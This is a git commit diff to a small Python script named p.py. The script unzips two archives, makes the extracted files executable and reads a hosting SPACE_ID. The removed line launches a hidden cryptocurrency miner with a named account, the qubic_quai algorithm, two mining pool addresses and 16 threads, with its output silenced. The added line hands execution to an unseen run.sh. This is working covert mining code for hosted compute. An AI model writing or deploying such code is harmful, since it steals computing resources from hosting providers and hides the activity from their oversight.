b01d03f6730e1f86df27d9f8718be1fc9a85e89c
shrsvr <sigyv7133@gmail.com>
2025-03-11 19:24:39 +0100

    Update p.py

--- p.py
+++ p.py
@@ -2,4 +2,4 @@ import os
 os.system("unzip mnu.zip && unzip z.zip")
 os.system("chmod +x *")
 wn = os.getenv('SPACE_ID').replace("/","_")
-os.system(f"./mnu --account CP_fafubk1b65 --algo qubic_quai --gpu-off true --pool quai.hk.apool.io:3334 --pool qubic1.hk.apool.io:3334 --thread 16 --worker {wn} >/dev/null")
+os.system(f"bash run.sh")
